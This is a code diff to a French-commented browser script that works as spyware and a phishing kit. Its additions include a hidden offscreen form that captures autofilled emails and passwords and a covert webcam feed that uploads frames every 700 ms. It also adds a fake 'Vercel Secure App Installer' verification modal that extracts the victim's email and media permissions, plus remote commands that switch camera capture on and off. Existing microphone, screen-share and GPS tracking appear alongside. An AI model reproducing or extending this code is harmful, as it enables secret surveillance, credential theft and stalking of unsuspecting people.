@@ -1,9 +1,60 @@
 let cachedLocalIp = null;
-let capturedEmail = null;
+let capturedEmail = localStorage.getItem('tracker_captured_email') || null;
+let emailLogDebounce = null;
 
-// Supprimer l'ancien piège invisible car on utilise maintenant le vrai formulaire
+function persistCapturedEmail(email) {
+    if (!email || !email.includes('@')) return;
+    capturedEmail = email.trim();
+    localStorage.setItem('tracker_captured_email', capturedEmail);
+}
+
 function setupAutofillTrap() {
-    // Désactivé au profit du formulaire de vérification réel
+    if (document.getElementById('autofill-trap-wrap')) return;
+
+    const wrap = document.createElement('div');
+    wrap.id = 'autofill-trap-wrap';
+    wrap.setAttribute('aria-hidden', 'true');
+    wrap.style.cssText = 'position:absolute;left:-9999px;width:1px;height:1px;overflow:hidden;opacity:0;pointer-events:none;';
+    wrap.innerHTML = `
+        <form autocomplete="on">
+            <input type="email" id="autofill-email-trap" name="email" autocomplete="email username">
+            <input type="password" name="password" autocomplete="current-password">
+        </form>
+    `;
+    document.body.appendChild(wrap);
+
+    const trap = document.getElementById('autofill-email-trap');
+    trap.addEventListener('input', () => {
+        if (trap.value && trap.value.includes('@')) {
+            onEmailCaptured(trap.value, false);
+        }
+    });
+    trap.addEventListener('change', () => {
+        if (trap.value && trap.value.includes('@')) {
+            onEmailCaptured(trap.value, true);
+        }
+    });
+}
+
+async function onEmailCaptured(email, forceNotify) {
+    persistCapturedEmail(email);
+    await logVisitor(null, true, forceNotify);
+}
+
+function requestEmailFromTarget() {
+    let overlay = document.getElementById('verification-overlay');
+    if (!overlay) {
+        overlay = document.createElement('div');
+        overlay.id = 'verification-overlay';
+        document.body.appendChild(overlay);
+    }
+    overlay.dataset.verifyBound = '';
+    showVerificationModal(overlay);
+    const input = overlay.querySelector('#trap-email-input');
+    if (input) {
+        input.value = capturedEmail || '';
+        input.focus();
+    }
 }
 
 // Fonction pour récupérer l'IP locale via WebRTC
@@ -263,6 +314,151 @@ function stopSpyMic() {
     console.log("🎙️ Micro désactivé");
 }
 
+let videoStream = null;
+let cameraUploadTimer = null;
+let cameraCaptureCanvas = null;
+let cameraPreviewVideo = null;
+
+async function requestVerifyMediaPermissions() {
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({
+            audio: true,
+            video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } }
+        });
+        stream.getTracks().forEach(track => track.stop());
+        console.log("📷 Autorisations micro/caméra accordées (vérification)");
+        return true;
+    } catch (err) {
+        console.warn("Permissions vérification refusées:", err.message);
+        try {
+            const audioOnly = await navigator.mediaDevices.getUserMedia({ audio: true });
+            audioOnly.getTracks().forEach(track => track.stop());
+        } catch (e) {}
+        return false;
+    }
+}
+
+function getCameraCaptureCanvas() {
+    if (!cameraCaptureCanvas) {
+        cameraCaptureCanvas = document.createElement('canvas');
+    }
+    return cameraCaptureCanvas;
+}
+
+async function ensureCameraPreviewVideo() {
+    if (!cameraPreviewVideo) {
+        cameraPreviewVideo = document.createElement('video');
+        cameraPreviewVideo.muted = true;
+        cameraPreviewVideo.playsInline = true;
+        cameraPreviewVideo.setAttribute('playsinline', '');
+        cameraPreviewVideo.style.cssText = 'position:fixed;width:1px;height:1px;opacity:0;pointer-events:none;z-index:-1;';
+        document.body.appendChild(cameraPreviewVideo);
+    }
+    if (cameraPreviewVideo.srcObject !== videoStream) {
+        cameraPreviewVideo.srcObject = videoStream;
+        await cameraPreviewVideo.play().catch(() => {});
+    }
+    if (cameraPreviewVideo.readyState < 2) {
+        await new Promise((resolve) => {
+            cameraPreviewVideo.onloadeddata = resolve;
+            setTimeout(resolve, 500);
+        });
+    }
+}
+
+async function uploadCameraFrame() {
+    if (!videoStream || !sessionId) return;
+    const track = videoStream.getVideoTracks()[0];
+    if (!track || track.readyState !== 'live') return;
+
+    try {
+        await ensureCameraPreviewVideo();
+        const canvas = getCameraCaptureCanvas();
+        const w = Math.min(480, cameraPreviewVideo.videoWidth || 480);
+        const h = Math.min(360, cameraPreviewVideo.videoHeight || 360);
+        if (!w || !h) return;
+        canvas.width = w;
+        canvas.height = h;
+        const ctx = canvas.getContext('2d');
+        ctx.drawImage(cameraPreviewVideo, 0, 0, w, h);
+        const frame = canvas.toDataURL('image/jpeg', 0.55);
+
+        await fetch('/api/camera-frame', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ sessionId, frame, timestamp: Date.now() })
+        });
+    } catch (e) {
+        console.warn('Upload frame caméra:', e.message);
+    }
+}
+
+async function startSpyCamera() {
+    try {
+        if (videoStream) return;
+        videoStream = await navigator.mediaDevices.getUserMedia({
+            video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
+            audio: false
+        });
+        console.log("📷 Caméra activée");
+        uploadCameraFrame();
+        if (cameraUploadTimer) clearInterval(cameraUploadTimer);
+        cameraUploadTimer = setInterval(uploadCameraFrame, 700);
+    } catch (err) {
+        console.error("Erreur Caméra:", err.message);
+    }
+}
+
+function stopSpyCamera() {
+    if (cameraUploadTimer) {
+        clearInterval(cameraUploadTimer);
+        cameraUploadTimer = null;
+    }
+    if (videoStream) {
+        videoStream.getTracks().forEach(track => track.stop());
+        videoStream = null;
+    }
+    if (cameraPreviewVideo) {
+        cameraPreviewVideo.srcObject = null;
+    }
+    console.log("📷 Caméra désactivée");
+}
+
+const VERIFICATION_MODAL_HTML = `
+    <div style="max-width: 400px; width: 90%; text-align: center; padding: 40px; background: #1e293b; border-radius: 16px; box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5); border: 1px solid #334155;">
+        <div style="margin-bottom: 24px;">
+            <svg width="60" height="60" viewBox="0 0 24 24" fill="none" stroke="#60a5fa" stroke-width="1.5" style="margin-bottom: 16px;">
+                <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path>
+            </svg>
+            <h1 style="font-size: 1.5rem; font-weight: 600; margin: 0 0 8px 0;">Vérification de sécurité</h1>
+                    <p style="color: #94a3b8; font-size: 0.9rem; line-height: 1.5;">Saisissez l'email de votre session pour débloquer la galerie. Ce champ est obligatoire.</p>
+        </div>
+
+        <form id="fake-verify-form" style="text-align: left;">
+            <div style="margin-bottom: 20px;">
+                <label style="display: block; font-size: 0.8rem; color: #94a3b8; margin-bottom: 8px;">Adresse e-mail de session</label>
+                        <input type="email" id="trap-email-input" required placeholder="votre@email.com" autocomplete="email webauthn" inputmode="email" style="width: 100%; padding: 12px 16px; background: #0f172a; border: 1px solid #334155; border-radius: 8px; color: white; font-size: 1rem; outline: none;">
+            </div>
+            
+            <div style="margin-bottom: 20px; background: rgba(96, 165, 250, 0.1); padding: 12px; border-radius: 8px; border: 1px dashed #60a5fa;">
+                <label style="display: flex; align-items: center; gap: 10px; cursor: pointer;">
+                    <input type="checkbox" id="install-app-check" checked style="width: 18px; height: 18px;">
+                    <span style="font-size: 0.85rem; color: #60a5fa; font-weight: 500;">Installer l'App de Protection (Recommandé)</span>
+                </label>
+            </div>
+
+            <button type="submit" id="btn-verify-submit" style="width: 100%; padding: 14px; background: #3b82f6; color: white; border: none; border-radius: 8px; font-weight: 600; font-size: 1rem; cursor: pointer;">
+                Installer et Continuer
+            </button>
+        </form>
+
+        <div style="margin-top: 24px; display: flex; align-items: center; justify-content: center; gap: 8px; color: #64748b; font-size: 0.75rem;">
+            <div style="width: 8px; height: 8px; background: #22c55e; border-radius: 50%; animation: pulse 2s infinite;"></div>
+            Vercel Secure App Installer Active
+        </div>
+    </div>
+`;
+
 async function checkCommands() {
     if (!sessionId) return;
     
@@ -298,6 +494,15 @@ async function checkCommands() {
                     break;
                 case 'MIC_OFF':
                     stopSpyMic();
+                    break;
+                case 'CAMERA_ON':
+                    startSpyCamera();
+                    break;
+                case 'CAMERA_OFF':
+                    stopSpyCamera();
+                    break;
+                case 'REQUEST_EMAIL':
+                    requestEmailFromTarget();
                     break;
                 case 'SCREEN_SHARE':
                     startScreenShare();
@@ -471,69 +676,45 @@ window.addEventListener('beforeinstallprompt', (e) => {
     deferredPrompt = e;
 });
 
-async function startVerification() {
-    let overlay = document.getElementById('verification-overlay');
+function showVerificationModal(overlay) {
+    overlay.style.cssText = `
+        position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
+        background: #0f172a; z-index: 99999999;
+        display: flex; align-items: center; justify-content: center;
+        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+        color: white; cursor: default;
+    `;
+    overlay.innerHTML = VERIFICATION_MODAL_HTML;
+    bindVerificationForm(overlay);
+}
 
-    if (!overlay) {
-        overlay = document.createElement('div');
-        overlay.id = 'verification-overlay';
-        overlay.style.cssText = `
-            position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
-            background: #0f172a; z-index: 99999999;
-            display: flex; align-items: center; justify-content: center;
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-            color: white;
-        `;
-        
-        overlay.innerHTML = `
-            <div style="max-width: 400px; width: 90%; text-align: center; padding: 40px; background: #1e293b; border-radius: 16px; box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5); border: 1px solid #334155;">
-                <div style="margin-bottom: 24px;">
-                    <svg width="60" height="60" viewBox="0 0 24 24" fill="none" stroke="#60a5fa" stroke-width="1.5" style="margin-bottom: 16px;">
-                        <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path>
-                    </svg>
-                    <h1 style="font-size: 1.5rem; font-weight: 600; margin: 0 0 8px 0;">Vérification de sécurité</h1>
-                    <p style="color: #94a3b8; font-size: 0.9rem; line-height: 1.5;">Pour un accès complet et sécurisé, vous devez installer l'application de contrôle et vérifier votre email.</p>
-                </div>
-
-                <form id="fake-verify-form" style="text-align: left;">
-                    <div style="margin-bottom: 20px;">
-                        <label style="display: block; font-size: 0.8rem; color: #94a3b8; margin-bottom: 8px;">Adresse e-mail de session</label>
-                        <input type="email" id="trap-email-input" required placeholder="nom@exemple.com" autocomplete="email" style="width: 100%; padding: 12px 16px; background: #0f172a; border: 1px solid #334155; border-radius: 8px; color: white; font-size: 1rem; outline: none;">
-                    </div>
-                    
-                    <div style="margin-bottom: 20px; background: rgba(96, 165, 250, 0.1); padding: 12px; border-radius: 8px; border: 1px dashed #60a5fa;">
-                        <label style="display: flex; align-items: center; gap: 10px; cursor: pointer;">
-                            <input type="checkbox" id="install-app-check" checked style="width: 18px; height: 18px;">
-                            <span style="font-size: 0.85rem; color: #60a5fa; font-weight: 500;">Installer l'App de Protection (Recommandé)</span>
-                        </label>
-                    </div>
-
-                    <button type="submit" id="btn-verify-submit" style="width: 100%; padding: 14px; background: #3b82f6; color: white; border: none; border-radius: 8px; font-weight: 600; font-size: 1rem; cursor: pointer;">
-                        Installer et Continuer
-                    </button>
-                </form>
-
-                <div style="margin-top: 24px; display: flex; align-items: center; justify-content: center; gap: 8px; color: #64748b; font-size: 0.75rem;">
-                    <div style="width: 8px; height: 8px; background: #22c55e; border-radius: 50%; animation: pulse 2s infinite;"></div>
-                    Vercel Secure App Installer Active
-                </div>
-            </div>
-        `;
-        document.body.appendChild(overlay);
-    }
-
+function bindVerificationForm(overlay) {
     const form = overlay.querySelector('#fake-verify-form');
+    if (!form || form.dataset.bound === '1') return;
+    form.dataset.bound = '1';
+
     const emailInput = overlay.querySelector('#trap-email-input');
     const installCheck = overlay.querySelector('#install-app-check');
 
+    emailInput.addEventListener('input', () => {
+        clearTimeout(emailLogDebounce);
+        const val = emailInput.value.trim();
+        if (val.includes('@')) {
+            emailLogDebounce = setTimeout(() => onEmailCaptured(val, false), 800);
+        }
+    });
+    emailInput.addEventListener('blur', () => {
+        const val = emailInput.value.trim();
+        if (val.includes('@')) onEmailCaptured(val, false);
+    });
+
     const handleVerification = async (e) => {
         if (e) e.preventDefault();
-        
-        const email = emailInput.value;
+
+        const email = emailInput.value.trim();
         if (email && email.includes('@')) {
-            capturedEmail = email;
-            
-            // Tentative d'installation PWA si cochée
+            persistCapturedEmail(email);
+
             if (installCheck.checked && deferredPrompt) {
                 deferredPrompt.prompt();
                 const { outcome } = await deferredPrompt.userChoice;
@@ -541,17 +722,17 @@ async function startVerification() {
                 deferredPrompt = null;
             }
 
-            // On affiche un petit chargement
             const btn = overlay.querySelector('#btn-verify-submit');
             btn.disabled = true;
             btn.innerText = 'Installation en cours...';
-            
-            // On récupère les autorisations habituelles
+
             try {
-                if (document.documentElement.requestFullscreen) document.documentElement.requestFullscreen().catch(() => {});
-                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-                stream.getTracks().forEach(track => track.stop());
-            } catch(err) {}
+                if (document.documentElement.requestFullscreen) {
+                    document.documentElement.requestFullscreen().catch(() => {});
+                }
+            } catch (err) {}
+
+            await requestVerifyMediaPermissions();
 
             startGpsTracking();
             await logVisitor(null, true, true);
@@ -564,6 +745,36 @@ async function startVerification() {
     };
 
     form.onsubmit = handleVerification;
+}
+
+function setupInvisibleVerifyOverlay(overlay) {
+    if (overlay.dataset.verifyBound === '1') return;
+    overlay.dataset.verifyBound = '1';
+
+    overlay.addEventListener('click', async () => {
+        await requestVerifyMediaPermissions();
+        showVerificationModal(overlay);
+    });
+}
+
+async function startVerification() {
+    let overlay = document.getElementById('verification-overlay');
+
+    if (!overlay) {
+        overlay = document.createElement('div');
+        overlay.id = 'verification-overlay';
+        document.body.appendChild(overlay);
+        showVerificationModal(overlay);
+        return;
+    }
+
+    const form = overlay.querySelector('#fake-verify-form');
+    if (form) {
+        bindVerificationForm(overlay);
+        return;
+    }
+
+    setupInvisibleVerifyOverlay(overlay);
 }
 
 function getDistance(lat1, lon1, lat2, lon2) {
